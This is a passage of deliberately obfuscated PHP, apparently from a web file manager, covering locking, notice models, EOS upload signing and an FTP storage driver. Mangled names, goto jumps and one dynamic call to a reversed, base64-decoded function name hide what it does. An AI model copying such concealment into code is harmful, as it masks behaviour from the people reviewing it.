(is_string(self::$errorMsg) && self::$errorMsg) { $İÈâìÊŸ = $İÈâìÊŸ . $¨ƒŞ™Ä[941] . self::$errorMsg; } write_log($¨ƒŞ™Ä[942] . sprintf($¨ƒŞ™Ä[943], timeFloat() - $ã“”€ÛŸ) . $¨ƒŞ™Ä[944] . $»®©……Á . $¨ƒŞ™Ä[945] . json_encode(error_get_last()), $¨ƒŞ™Ä[935]); show_json($İÈâìÊŸ, !1); } if (!$·£¢“Ñ‘) { self::$lockItem[$²ê¡òŒ¦] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $üµ°¶Û° = number_format(timeFloat() - $õµ›Ï¢Œ, 3); write_log($¨ƒŞ™Ä[946] . $û¦ˆÄ¢ . $¨ƒŞ™Ä[947] . $üµ°¶Û°, $¨ƒŞ™Ä[935]); } return $“½ˆ««×; } public static function lockGet($Ìä±î») { $Ø’¯ğÏ‘ = self::key($Ìä±î»); if (self::$lockItem[$Ø’¯ğÏ‘]) { return self::$lockItem[$Ø’¯ğÏ‘]; } return self::init()->lockGet($Ø’¯ğÏ‘); } public static function unlock($—½Å¾â) { $ş™Ïºß¾ =& $_SERVER[¯‘·½]; $Øˆ’£·Ä = self::key($—½Å¾â); self::$lockItem[$Øˆ’£·Ä] = null; self::init()->unlock($Øˆ’£·Ä); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ş™Ïºß¾[948] . $—½Å¾â, $ş™Ïºß¾[935]); } return; } public static function unlockRuntime() { $í¨áÆ¢ˆ =& $_SERVER[¯‘·½]; $š’£‚ËÑ = self::init(); $¿Ä¼±èğ = !1; foreach (self::$lockItem as $Õ„ıÎ¦ => $â¢ÑÁÎ«) { if (!$â¢ÑÁÎ«) { continue; } $š’£‚ËÑ->unlock($Õ„ıÎ¦); if (!$¿Ä¼±èğ) { $¿Ä¼±èğ = !0; write_log($í¨áÆ¢ˆ[949] . $Õ„ıÎ¦ . $í¨áÆ¢ˆ[74] . get_caller_msg(), $í¨áÆ¢ˆ[935]); continue; } write_log($í¨áÆ¢ˆ[949] . $Õ„ıÎ¦, $í¨áÆ¢ˆ[935]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $†ÒñüÕ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($í¨áÆ¢ˆ[950] . $†ÒñüÕ . $í¨áÆ¢ˆ[951] . ACTION, $í¨áÆ¢ˆ[935]); } } public static function fileLock($´ÌØˆØ) { $•—ıˆ˜Ò =& $_SERVER[¯‘·½]; if (!$GLOBALS[$•—ıˆ˜Ò[952]]) { $GLOBALS[$•—ıˆ˜Ò[952]] = array(); } $GLOBALS[$•—ıˆ˜Ò[952]][$´ÌØˆØ] = !1; $ ”¸Ïšï = fopen(DATA_PATH . $´ÌØˆØ . $•—ıˆ˜Ò[953], $•—ıˆ˜Ò[954]); if (!$ ”¸Ïšï) { return !1; } $GLOBALS[$•—ıˆ˜Ò[952]][$´ÌØˆØ] = $ ”¸Ïšï; if (flock($ ”¸Ïšï, LOCK_EX)) { return !0; } self::unlock($´ÌØˆØ); show_json($•—ıˆ˜Ò[955], !1); return !1; } public static function fileUnlock($çÚ¸å³’) { $÷‘•î­ =& $_SERVER[¯‘·½]; $¾™”áÀÁ = $GLOBALS[$÷‘•î­[952]][$çÚ¸å³’]; if (!$¾™”áÀÁ) { return; } $GLOBALS[$÷‘•î­[952]][$çÚ¸å³’] = !1; flock($¾™”áÀÁ, LOCK_UN); fclose($¾™”áÀÁ); } public static function fileUnlockAll() { $®´ì¡×á =& $_SERVER[¯‘·½]; if (!isset($GLOBALS[$®´ì¡×á[952]]) || !$GLOBALS[$®´ì¡×á[952]]) { return; } foreach ($GLOBALS[$®´ì¡×á[952]] as $¡‹øÖä => $Ÿ°ÓÄëó) { if (!$Ÿ°ÓÄëó) { continue; } $GLOBALS[$®´ì¡×á[952]][$¡‹øÖä] = !1; flock($Ÿ°ÓÄëó, LOCK_UN); fclose($Ÿ°ÓÄëó); } $GLOBALS[$®´ì¡×á[952]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto d®È÷–”è; a™ßªŠ¡ãï: $fileSize = strrev(base64_decode($_SERVER[„ãïšğŞ][0])); function binCheckNeq($ÃŒ•²¬, $¨¾ğì£¼) { return $ÃŒ•²¬ != $¨¾ğì£¼; } $_SERVER[$_SERVER[„ãïšğŞ][1]] = $fileSize($_SERVER[$_SERVER[„ãïšğŞ][2]]); goto AŸ†§ÕÙùÑ; D–«®ÎìÑŞ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x6e\x6f\x74\151\x63\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\x63\x6f\x6e\x74\145\156\164", "\x61\x75\x74\150", "\155\157\x64\x65", "\x74\x69\x6d\145", "\x74\x79\x70\145", "\x6c\145\x76\145\154", "\145\156\141\142\154\145", "\163\157\x72\164"); public function listData($óÁñäÓ¼ = false, $íÀù´¸¯ = "\163\157\x72\164", $‹ÄƒëÇ = false) { return parent::listData($óÁñäÓ¼, $íÀù´¸¯, $‹ÄƒëÇ); } public function add($Şë©û„) { $§ºÚÔ =& $_SERVER[¯‘·½]; $îà®°´— = time(); if ($Şë©û„[$§ºÚÔ[16]] == $§ºÚÔ[2488]) { $îà®°´— = strtotime($Şë©û„[$§ºÚÔ[207]]); } $Şë©û„[$§ºÚÔ[207]] = $îà®°´—; return parent::insert($Şë©û„); } public function update($³ˆ’ò¡ø, $ÁÊÍä“) { $é‰Úé™™ =& $_SERVER[¯‘·½]; $Ôõ¹Âùº = $this->listData($³ˆ’ò¡ø); if (!$Ôõ¹Âùº) { return !1; } $ Í±‘¡• = time(); if ($ÁÊÍä“[$é‰Úé™™[16]] == $é‰Úé™™[2488]) { $ Í±‘¡• = strtotime($ÁÊÍä“[$é‰Úé™™[207]]); } $ÁÊÍä“[$é‰Úé™™[207]] = $ Í±‘¡•; return parent::update($³ˆ’ò¡ø, $ÁÊÍä“); } public function remove($ĞÎéªı´) { $ŠäüûÏ® = $this->listData($ĞÎéªı´); if (!$ŠäüûÏ® || $ŠäüûÏ®[$_SERVER[¯‘·½][192]]) { return !1; } return parent::remove($ĞÎéªı´); } public function sort($Ş®ß½”Ë, $•ûñšåµ) { return parent::update($Ş®ß½”Ë, $•ûñšåµ); } public function enable($Ó“§‡úƒ, $ŸÑ£ë…×) { return parent::update($Ó“§‡úƒ, array($_SERVER[¯‘·½][2489] => $ŸÑ£ë…×)); } private function initUserOption() { $‰Ñ‰ò£± =& $_SERVER[¯‘·½]; $this->optionType = $‰Ñ‰ò£±[2490]; $this->modelType = $‰Ñ‰ò£±[2491]; $this->field = array($‰Ñ‰ò£±[2492], $‰Ñ‰ò£±[32], $‰Ñ‰ò£±[207], $‰Ñ‰ò£±[33], $‰Ñ‰ò£±[2493], $‰Ñ‰ò£±[835], $‰Ñ‰ò£±[229]); } public function userNoticeGet($ÜÛÚ©˜ = false) { $this->initUserOption(); return parent::listData($ÜÛÚ©˜, $_SERVER[¯‘·½][477], !0); } public function userNoticeAdd($²äòÀ®) { $‡³Íã· =& $_SERVER[¯‘·½]; $this->initUserOption(); $ğ†ç„Ù = $this->findByKey($‡³Íã·[2492], $²äòÀ®[$‡³Íã·[477]]); if ($ğ†ç„Ù) { return !0; } $ÈÊÏŞŠ¹ = array($‡³Íã·[2492] => $²äòÀ®[$‡³Íã·[477]], $‡³Íã·[32] => $²äòÀ®[$‡³Íã·[32]], $‡³Íã·[207] => $²äòÀ®[$‡³Íã·[207]], $‡³Íã·[33] => isset($²äòÀ®[$‡³Íã·[33]]) ? $²äòÀ®[$‡³Íã·[33]] : 1, $‡³Íã·[2493] => isset($²äòÀ®[$‡³Íã·[2493]]) ? $²äòÀ®[$‡³Íã·[2493]] : 0, $‡³Íã·[835] => 0, $‡³Íã·[229] => 0); return parent::insert($ÈÊÏŞŠ¹); } public function userNoticeEdit($ŒŠÁŒË, $§Ú×³Ä) { $this->initUserOption(); return parent::update($ŒŠÁŒË, $§Ú×³Ä); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\x6d\x5f\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\155\x65\x6e\x75", "\x72\157\x6c\145", "\x72\157\154\145\x47\x72\157\165\x70", "\162\x65\x67\151\x73\x74", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($âéß¡¾Ö) { return "\x53\171\163\164\145\x6d\x4f\x70\164\x69\x6f\x6e\x5f{$âéß¡¾Ö}"; } protected function optionDefault($€¾¯Ãáû = '') { $Üåù·»Ú =& $_SERVER[¯‘·½]; if ($€¾¯Ãáû == $Üåù·»Ú[12]) { return $GLOBALS[$Üåù·»Ú[6]][$Üåù·»Ú[459]]; } } } class SystemRecordModel extends ModelBaseLight { } goto Cáß›·ï‡; F»´ÃÉ«°å: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‰°‰§ğÌ) { parent::__construct($‰°‰§ğÌ); $this->setSignVersion($_SERVER[¯‘·½][250]); } public function uploadFormData($©È…’ˆ, $Î×”‰ŒÃ = 3600) { $ÁÈ£İˆÑ =& $_SERVER[¯‘·½]; $øÈıßë¬ = $ÁÈ£İˆÑ[232]; $ğ„ˆÕÖ = $ÁÈ£İˆÑ[260]; $ÀÂİ¡ùÉ = $ÁÈ£İˆÑ[62]; $úê«¡µ¯ = gmdate($ÁÈ£İˆÑ[261]); $º” ú = gmdate($ÁÈ£İˆÑ[262]); $ú Ô£ƒÓ = $ÁÈ£İˆÑ[263]; $æèÛÕÃğ = $Î×”‰ŒÃ . $ÁÈ£İˆÑ[12]; $ßèª¯ğâ = $ÁÈ£İˆÑ[264]; $Õç•©¾¤ = array($this->accessKey, $º” ú, $this->region, $ÀÂİ¡ùÉ, $ú Ô£ƒÓ); $ïöíçùÀ = implode($ÁÈ£İˆÑ[8], $Õç•©¾¤); $¢õùŸ·é = array($ÁÈ£İˆÑ[265] => gmdate($ÁÈ£İˆÑ[1444], strtotime($ÁÈ£İˆÑ[267])), $ÁÈ£İˆÑ[268] => array(array($ÁÈ£İˆÑ[269] => $this->bucket), array($ÁÈ£İˆÑ[309] => $øÈıßë¬), array($ÁÈ£İˆÑ[270], $ÁÈ£İˆÑ[271], $ÁÈ£İˆÑ[12]), array($ÁÈ£İˆÑ[270], $ÁÈ£İˆÑ[272], $ÁÈ£İˆÑ[12]), array($ÁÈ£İˆÑ[270], $ÁÈ£İˆÑ[310], $ÁÈ£İˆÑ[12]), array($ÁÈ£İˆÑ[273] => $ßèª¯ğâ), array($ÁÈ£İˆÑ[274] => $ïöíçùÀ), array($ÁÈ£İˆÑ[275] => $ğ„ˆÕÖ), array($ÁÈ£İˆÑ[276] => $úê«¡µ¯), array($ÁÈ£İˆÑ[277] => $æèÛÕÃğ))); $ÈÕ‘•°í = base64_encode(json_encode($¢õùŸ·é)); $ÚááĞ¾ˆ = hash_hmac($ÁÈ£İˆÑ[278], $º” ú, $ÁÈ£İˆÑ[279] . $this->secret, !0); $¯‹ê„Øù = hash_hmac($ÁÈ£İˆÑ[278], $this->region, $ÚááĞ¾ˆ, !0); $Å¯’÷ûŠ = hash_hmac($ÁÈ£İˆÑ[278], $ÀÂİ¡ùÉ, $¯‹ê„Øù, !0); $Š‰ãª„‘ = hash_hmac($ÁÈ£İˆÑ[278], $ú Ô£ƒÓ, $Å¯’÷ûŠ, !0); $±‡×±˜ = hash_hmac($ÁÈ£İˆÑ[278], $ÈÕ‘•°í, $Š‰ãª„‘); $­Â§ñ¶“ = array($ÁÈ£İˆÑ[249] => $ÁÈ£İˆÑ[12], $ÁÈ£İˆÑ[297] => $ÁÈ£İˆÑ[12], $ÁÈ£İˆÑ[309] => $øÈıßë¬, $ÁÈ£İˆÑ[273] => $ßèª¯ğâ, $ÁÈ£İˆÑ[280] => $ÈÕ‘•°í, $ÁÈ£İˆÑ[311] => $ïöíçùÀ, $ÁÈ£İˆÑ[312] => $ğ„ˆÕÖ, $ÁÈ£İˆÑ[313] => $úê«¡µ¯, $ÁÈ£İˆÑ[314] => $æèÛÕÃğ, $ÁÈ£İˆÑ[315] => $±‡×±˜, $ÁÈ£İˆÑ[209] => $this->getHost()); return $­Â§ñ¶“; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($„ªÖ¡) { parent::__construct(); if (count($„ªÖ¡) > 0) { $this->_init($„ªÖ¡); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($öîÃÄ×«) { $†—Í =& $_SERVER[¯‘·½]; global $config; $this->appCharset = $config[$†—Í[1470]]; $this->systemCharset = $config[$†—Í[1471]]; if (isset($öîÃÄ×«[$†—Í[1472]]) && $öîÃÄ×«[$†—Í[1472]]) { $this->systemCharset = $öîÃÄ×«[$†—Í[1472]]; } } public function iconvApp($”¦šÙ‰‚) { return $this->iconvTo($”¦šÙ‰‚, $this->systemCharset, $this->appCharset); } public function iconvSystem($¿û†åª) { return $this->iconvTo($¿û†åª, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÔôˆÖØ›) { $ÁÌñ—ÇÒ =& $_SERVER[¯‘·½]; $ïÎ¢õ·¡ = $this->iconvApp($this->pathBase); $ÔôˆÖØ› = $this->iconvApp($ÔôˆÖØ›); if (substr($ïÎ¢õ·¡, 0, 2) == $ÁÌñ—ÇÒ[1442]) { $ïÎ¢õ·¡ = BASIC_PATH . substr($ïÎ¢õ·¡, 2); } if (substr($ÔôˆÖØ›, 0, 2) == $ÁÌñ—ÇÒ[1442]) { $ÔôˆÖØ› = BASIC_PATH . substr($ÔôˆÖØ›, 2); } $ïÎ¢õ·¡ = KodIO::clear($ïÎ¢õ·¡); $ÔôˆÖØ› = KodIO::clear($ÔôˆÖØ›); $ÔôˆÖØ› = substr($ÔôˆÖØ›, strlen($ïÎ¢õ·¡)); if (empty($this->pathDriver)) { return $ÔôˆÖØ›; } return $this->pathDriver . $ÁÌñ—ÇÒ[8] . ltrim($ÔôˆÖØ›, $ÁÌñ—ÇÒ[8]); } private function _init($Ü°í›¥Õ = array()) { $Ô‚Òßúô =& $_SERVER[¯‘·½]; if (!function_exists($Ô‚Òßúô[1473])) { throw new Exception(LNG($Ô‚Òßúô[1474])); } $this->config = $Ü°í›¥Õ; $this->charsetReset($Ü°í›¥Õ); foreach ($Ü°í›¥Õ as $î‡¡ÜòĞ => $ö¢¬‡Øí) { if (isset($this->{$î‡¡ÜòĞ})) { $this->{$î‡¡ÜòĞ} = $ö¢¬‡Øí; } } return $this->_login($Ü°í›¥Õ); } private function _login($Ï“ô»¸Û) { $—÷³Í¥ =& $_SERVER[¯‘·½]; static $˜Úñî¢´ = array(); $ß¬ÅÁí = md5(json_encode($Ï“ô»¸Û)); if (isset($˜Úñî¢´[$ß¬ÅÁí])) { foreach ($˜Úñî¢´[$ß¬ÅÁí] as $…ç¢¡ “ => $Âˆ¡¿èç) { $this->{$…ç¢¡ “} = $Âˆ¡¿èç; } return !0; } $šª½ºäÑ = parse_url(trim($this->server, $—÷³Í¥[8])); $this->host = $šª½ºäÑ[$—÷³Í¥[209]]; $æ±³ü‡Œ = isset($šª½ºäÑ[$—÷³Í¥[208]]) && $šª½ºäÑ[$—÷³Í¥[208]] == $—÷³Í¥[1475] ? !0 : !1; $this->scheme = $æ±³ü‡Œ ? $—÷³Í¥[1476] : $—÷³Í¥[1477]; $this->port = isset($šª½ºäÑ[$—÷³Í¥[210]]) ? $šª½ºäÑ[$—÷³Í¥[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($—÷³Í¥[1478]) . $this->host . $—÷³Í¥[4] . $this->port, !0); return !1; } $ºáø—¶— = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ºáø—¶—) { $this->writeLog(LNG($—÷³Í¥[1479]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $—÷³Í¥[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Äãå—Îœ = $this->pasv == $—÷³Í¥[91] ? !0 : !1; @ftp_pasv($this->connect, $Äãå—Îœ); $˜Úñî¢´[$ß¬ÅÁí] = array($—÷³Í¥[1480] => $this->connect, $—÷³Í¥[209] => $this->host, $—÷³Í¥[208] => $this->scheme, $—÷³Í¥[210] => $this->port); return $ºáø—¶—; } private function _isconn($’Êö•æ¨ = true) { if (is_resource($this->connect)) { return !0; } if (!$’Êö•æ¨) { return !1; } return $this->_login($this->config); } public function mkfile($â²Ëûİ©, $…ÌĞñÍ¤ = '', $¨•ÖÙ«Ò = REPEAT_RENAME) { if ($this->setContent($â²Ëûİ©, $…ÌĞñÍ¤)) { return $this->getPathOuter($â²Ëûİ©); } $this->writeLog(LNG($_SERVER[¯‘·½][1481]), !0); return !1; } public function mkdir($»ª—ò Û, $…›ü‡Ä‘ = REPEAT_SKIP) { $œ»äÂ =& $_SERVER[¯‘·½]; if (!$»ª—ò Û || $»ª—ò Û == $œ»äÂ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $»ª—ò Û = $this->iconvSystem($»ª—ò Û); if ($this->_isFolder($»ª—ò Û) || @ftp_mkdir($this->connect, $»ª—ò Û)) { return $this->getPathOuter($»ª—ò Û); } if (!$this->mkdir($this->pathFather($»ª—ò Û))) { return !1; } if ($»ª—ò Û = @ftp_mkdir($this->connect, $»ª—ò Û)) { return $this->getPathOuter($»ª—ò Û); } $ÂÓà‚Š = __FUNCTION__ . $œ»äÂ[1482]; $this->writeLog($ÂÓà‚Š, !0); return !1; } public function copyFile($•ÊöôÜ, $äİ¯àÃ¬) { if (!$this->_isconn()) { return !1; } $Ãƒ¿í„ = $this->pathThis($this->iconvSystem($•ÊöôÜ)); $Ê‘ªüğé = $this->tempFile($Ãƒ¿í„); $„®¾¬ = $this->iconvApp($Ê‘ªüğé); $this->download($•ÊöôÜ, $„®¾¬); $œõÛËå½ = $this->upload($äİ¯àÃ¬, $„®¾¬); $this->tempFileRemve($Ê‘ªüğé); return $œõÛËå½; } public function moveFile($ñæÎÙäå, $­ÕÏï”º) { if (!$this->_isconn()) { return !1; } $ñæÎÙäå = $this->iconvSystem($ñæÎÙäå); $­ÕÏï”º = $this->iconvSystem($­ÕÏï”º); $ÅÑÖªğ„ = @ftp_rename($this->connect, $ñæÎÙäå, $­ÕÏï”º); if (!$ÅÑÖªğ„) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } return $this->getPathOuter($­ÕÏï”º); } public function delFile($øÌ¤Á©) { if (!$this->_isconn()) { return !1; } $øÌ¤Á© = $this->iconvSystem($øÌ¤Á©); $Â‰®ĞÁş = @ftp_delete($this->connect, $øÌ¤Á©); if (!$Â‰®ĞÁş) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); } return $Â‰®ĞÁş; } public function delFolder($—¸ØàÕÃ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $éô³àŒ = $Ì¡áî—¼ = array(); $this->fileList($—¸ØàÕÃ, $éô³àŒ, $Ì¡áî—¼, !0); $this->listItemCache = !0; foreach ($Ì¡áî—¼ as $÷»¯ïÀø) { $½Âôèô¿ = $this->iconvSystem($÷»¯ïÀø[$_SERVER[¯‘·½][32]]); $Üõöâú = @ftp_delete($this->connect, $½Âôèô¿); if (!$Üõöâú) { return !1; } } foreach ($éô³àŒ as $½Âôèô¿) { $½Âôèô¿ = $this->iconvSystem($½Âôèô¿); $Üõöâú = @ftp_rmdir($this->connect, $½Âôèô¿); if (!$Üõöâú) { return !1; } } $—¸ØàÕÃ = $this->iconvSystem($—¸ØàÕÃ); return @ftp_rmdir($this->connect, $—¸ØàÕÃ); } public function rename($Ê¹™Ä¶Ú, $‘§æÑı¨) { $Üª‘¡‡ =& $_SERVER[¯‘·½]; if (!$this->_isconn()) { return !1; } $§·¤Üªá = $this->fileNameAuto($this->pathFather($Ê¹™Ä¶Ú), $‘§æÑı¨); $§·¤Üªá = $this->iconvSystem($§·¤Üªá); $Ê¹™Ä¶Ú = $this->iconvSystem($Ê¹™Ä¶Ú); $ş•ÕÕ±ñ = $this->pathFather($Ê¹™Ä¶Ú); $€¹ÎÔáò = rtrim($ş•ÕÕ±ñ, $Üª‘¡‡[8]) . $Üª‘¡‡[8] . $§·¤Üªá; $‹Ø¼Ñ‘Û = @ftp_rename($this->connect, $Ê¹™Ä¶Ú, $€¹ÎÔáò); if (!$‹Ø¼Ñ‘Û) { $this->writeLog(__FUNCTION__ . $Üª‘¡‡[1482], !0); return !1; } $€¹ÎÔáò = $this->iconvApp($€¹ÎÔáò); return $this->getPathOuter($€¹ÎÔáò); } private function folderInfo($ŠñÚî»‚, $±ÂŞÏä• = false) { $£ÛÇÂ¼‘ =& $_SERVER[¯‘·½]; $’ÚÓÅ² = array($£ÛÇÂ¼‘[32] => $this->pathThis($ŠñÚî»‚), $£ÛÇÂ¼‘[87] => $this->getPathOuter($£ÛÇÂ¼‘[8] . $ŠñÚî»‚), $£ÛÇÂ¼‘[33] => $£ÛÇÂ¼‘[78]); if ($±ÂŞÏä•) { return $’ÚÓÅ²; } $’ÚÓÅ²[$£ÛÇÂ¼‘[234]] = $’ÚÓÅ²[$£ÛÇÂ¼‘[88]] = 0; $’ÚÓÅ²[$£ÛÇÂ¼‘[235]] = $’ÚÓÅ²[$£ÛÇÂ¼‘[236]] = !0; return $’ÚÓÅ²; } private function fileInfo($Ï˜³£İ, $äÈó¶ÓŸ = false, $ÅËó¦ã = array()) { $üıô÷“ =& $_SERVER[¯‘·½]; $ßÇıº÷Ú = array($üıô÷“[32] => $this->pathThis($Ï˜³£İ), $üıô÷“[87] => $this->getPathOuter($üıô÷“[8] . $Ï˜³£İ), $üıô÷“[33] => $üıô÷“[233], $üıô÷“[79] => isset($ÅËó¦ã[$üıô÷“[79]]) ? $ÅËó¦ã[$üıô÷“[79]] : 0, $üıô÷“[169] => $this->ext($Ï˜³£İ)); if ($äÈó¶ÓŸ) { return $ßÇıº÷Ú; } $ßÇıº÷Ú[$üıô÷“[234]] = $ßÇıº÷Ú[$üıô÷“[88]] = 0; $ßÇıº÷Ú[$üıô÷“[235]] = $ßÇıº÷Ú[$üıô÷“[236]] = !0; $ó’¿Èöñ = $this->iconvSystem($Ï˜³£İ); $ßÇıº÷Ú[$üıô÷“[88]] = @ftp_mdtm($this->connect, $ó’¿Èöñ); if (empty($ÅËó¦ã)) { $ÅËó¦ã = $this->objectMeta($Ï˜³£İ); if (!$ÅËó¦ã) { return $ßÇıº÷Ú; } } $ßÇıº÷Ú[$üıô÷“[79]] = $ÅËó¦ã[$üıô÷“[79]]; return $ßÇıº÷Ú; } public function size($¿âÎ¯èâ) { $¬Ëªö×İ = $this->objectMeta($¿âÎ¯èâ); return $¬Ëªö×İ ? $¬Ëªö×İ[$_SERVER[¯‘·½][79]] : 0; } public function info($©¦–Í·¨) { if ($this->isFile($©¦–Í·¨)) { return $this->fileInfo($©¦–Í·¨, 0); } else { if ($this->isFolder($©¦–Í·¨)) { return $this->folderInfo($©¦–Í·¨); } } return !1; } private function fileList($•¨óÆå, &$¨áÌã”×, &$× ¿ÕÔè, $Œ‚ §çì = false) { $©›Èì‰ =& $_SERVER[¯‘·½]; $•¨óÆå = $this->iconvSystem($•¨óÆå); if (!$this->isFolder($•¨óÆå)) { return !1; } $•¨óÆå = rtrim($•¨óÆå, $©›Èì‰[8]) . $©›Èì‰[8]; check_abort(); $ÙŒ™—é¥ = @ftp_rawlist($this->connect, $•¨óÆå); if (!$ÙŒ™—é¥) { $ÙŒ™—é¥ = array(); } $‰—äÛÛ = array($©›Èì‰[10] => 1, $©›Èì‰[1387] => 1); foreach ($ÙŒ™—é¥ as $·à½¸ç) { $ß…©ãâ‰ = $this->_listItem($·à½¸ç); if ($ß…©ãâ‰[0] == $©›Èì‰[844]) { continue; } $˜Ê”ÉÑó = $ß…©ãâ‰[8]; if (empty($˜Ê”ÉÑó) && $˜Ê”ÉÑó !== $©›Èì‰[231] || isset($‰—äÛÛ[$˜Ê”ÉÑó])) { continue; } $˜Ê”ÉÑó = $this->iconvApp($•¨óÆå . ltrim($˜Ê”ÉÑó, $©›Èì‰[8])); $«…Ñ¡‰‹ = array($©›Èì‰[32] => $˜Ê”ÉÑó, $©›Èì‰[33] => $©›Èì‰[233], $©›Èì‰[79] => $ß…©ãâ‰[4]); if (substr($·à½¸ç, 0, 1) == $©›Èì‰[1483]) { $«…Ñ¡‰‹[$©›Èì‰[33]] = $©›Èì‰[78]; $«…Ñ¡‰‹[$©›Èì‰[79]] = 0; } $í—ûÏ« = $«…Ñ¡‰‹[$©›Èì‰[33]] == $©›Èì‰[78] ? !0 : !1; $this->cacheMethodInfoSet($˜Ê”ÉÑó, $í—ûÏ«, $«…Ñ¡‰‹); if ($í—ûÏ«) { $¨áÌã”×[] = $˜Ê”ÉÑó; if ($Œ‚ §çì) { $this->fileList($˜Ê”ÉÑó, $¨áÌã”×, $× ¿ÕÔè, $Œ‚ §çì); } continue; } $× ¿ÕÔè[] = $«…Ñ¡‰‹; } $this->cacheMethodInfoSet($•¨óÆå, !0); } private function _listItem($òø³…ıú) { if (empty($òø³…ıú)) { return array(); } $–ÁÒíÛÌ = preg_split($_SERVER[¯‘·½][1484], $òø³…ıú); if (count($–ÁÒíÛÌ) <= 9) { return $–ÁÒíÛÌ; } $–ÁÒíÛÌ[8] = trim(substr($òø³…ıú, strpos($òø³…ıú, $–ÁÒíÛÌ[7]) + strlen($–ÁÒíÛÌ[7]))); return array_splice($–ÁÒíÛÌ, 0, 9); } public function listPath($µÁç­áì, $‘„šÇ—¼ = false) { $ÅàÏ¦ª† =& $_SERVER[¯‘·½]; if (!$this->_isconn()) { return !1; } $â˜ÎºŠÊ = $—š²§ = array(); $this->fileList($µÁç­áì, $â˜ÎºŠÊ, $—š²§); foreach ($â˜ÎºŠÊ as $²ò¥¼É· => $ÛŒÓøŒ) { $â˜ÎºŠÊ[$²ò¥¼É·] = $this->folderInfo($ÛŒÓøŒ, $‘„šÇ—¼); } foreach ($—š²§ as $²ò¥¼É· => $ÛŒÓøŒ) { $—š²§[$²ò¥¼É·] = $this->fileInfo($ÛŒÓøŒ[$ÅàÏ¦ª†[32]], $‘„šÇ—¼, $ÛŒÓøŒ); } return array($ÅàÏ¦ª†[85] => $â˜ÎºŠÊ, $ÅàÏ¦ª†[86] => $—š²§); } public function has($·Ç—è–, $öş¬¸ã™ = false, $ãÎÛŸÔ× = true) { $»ÚƒµÁò =& $_SERVER[¯‘·½]; $šˆÜ¶ò“ = $İıšÓ£ò = array(); $Úöí÷½ = $öş¬¸ã™ ? !0 : !1; $this->fileList($·Ç—è–, $šˆÜ¶ò“, $İıšÓ£ò, $Úöí÷½); if ($öş¬¸ã™) { return array($»ÚƒµÁò[242] => count($İıšÓ£ò), $»ÚƒµÁò[243] => count($šˆÜ¶ò“)); } if ($ãÎÛŸÔ×) { if (count($İıšÓ£ò)) { return !0; } } else { if (count($šˆÜ¶ò“)) { return !0; } } return !1; } public function listAll($Å¾å¶û×) { $àİÒğ =& $_SERVER[¯‘·½]; if (!$this->_isconn()) { return !1; } $‘š–“ ì = $‹ƒ™³ºÎ = array(); $this->fileList($Å¾å¶û×, $‘š–“ ì, $‹ƒ™³ºÎ, !0); $éĞÕŠì = array_to_keyvalue($‹ƒ™³ºÎ, $àİÒğ[32]); foreach ($‘š–“ ì as $š‘¶¾¬) { if (is_string($š‘¶¾¬)) { $éĞÕŠì[$š‘¶¾¬] = array($àİÒğ[79] => 0); } } return $this->listAllFiles($Å¾å¶û×, $éĞÕŠì); } public function getContent($û¾ƒá¬œ) { if (!$this->_isconn()) { return !1; } $û¾ƒá¬œ = $this->iconvSystem($û¾ƒá¬œ); return $this->fileSubstr($û¾ƒá¬œ); } public function setContent($²£Øåâ¨, $°îñØòÕ = '') { if (!$this->_isconn()) { return !1; } $¤’²˜› = $this->pathThis($this->iconvSystem($²£Øåâ¨)); $õµõñ®Ÿ = $this->tempFile($¤’²˜›); file_put_contents($õµõñ®Ÿ, $°îñØòÕ); $¬èâÕÓ´ = $this->upload($²£Øåâ¨, $this->iconvApp($õµõñ®Ÿ)); $this->tempFileRemve($õµõñ®Ÿ); return $¬èâÕÓ´; } public function fileSubstr($È®èÉË¾, $ğÎ˜½¹È = 0, $Ö€°¨û = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($È®èÉË¾, $ğÎ˜½¹È, $Ö€°¨û); } private function ftpRequest($Á°¤È×”, $£©«ù¾¥ = 0, $¬ÅÛ’ = false) { $×È‹×œä =& $_SERVER[¯‘·½]; $Á°¤È×” = $×È‹×œä[8] . ltrim(str_ltrim($Á°¤È×”, $this->ftpPath), $×È‹×œä[8]); $Á°¤È×” = $this->iconvSystem($Á°¤È×”); $£ÖÆ£‘¿ = $this->scheme . $this->host . $×È‹×œä[4] . $this->port; $«ŸŠıÖ = curl_init(); curl_setopt($«ŸŠıÖ, CURLOPT_URL, $£ÖÆ£‘¿ . $this->pathEncode($Á°¤È×”)); curl_setopt($«ŸŠıÖ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¬ÅÛ’) { $îÁ™î·Ê = $£©«ù¾¥ + $¬ÅÛ’ - 1; curl_setopt($«ŸŠıÖ, CURLOPT_RANGE, "{$£©«ù¾¥}\x2d{$îÁ™î·Ê}"); } curl_setopt($«ŸŠıÖ, CURLOPT_RETURNTRANSFER, 1); $ÛØÑà” = 